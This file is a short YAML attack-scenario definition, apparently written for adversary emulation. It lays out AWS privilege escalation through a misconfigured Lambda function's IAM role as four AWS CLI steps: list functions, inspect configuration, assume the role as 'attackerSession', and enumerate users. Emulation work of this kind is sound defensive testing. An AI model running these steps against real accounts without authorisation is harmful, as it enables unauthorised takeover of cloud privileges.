name: Privilege Escalation via Lambda Role Assumption
description: Exploits misconfigured Lambda function to assume a more privileged IAM role.
mitre_technique: T1068
stage: Privilege Escalation
steps:
  - action: aws lambda list-functions --region ${aws_region}
    description: Enumerate Lambda functions to identify potential targets
  - action: aws lambda get-function-configuration --function-name ${lambda_function_name}
    description: Inspect function role and configuration
  - action: aws sts assume-role --role-arn ${target_role_arn} --role-session-name attackerSession
    description: Use AssumeRole on attached IAM role to gain elevated privileges
  - action: aws iam list-users --profile attackerSession
    description: Enumerate IAM users with escalated privileges
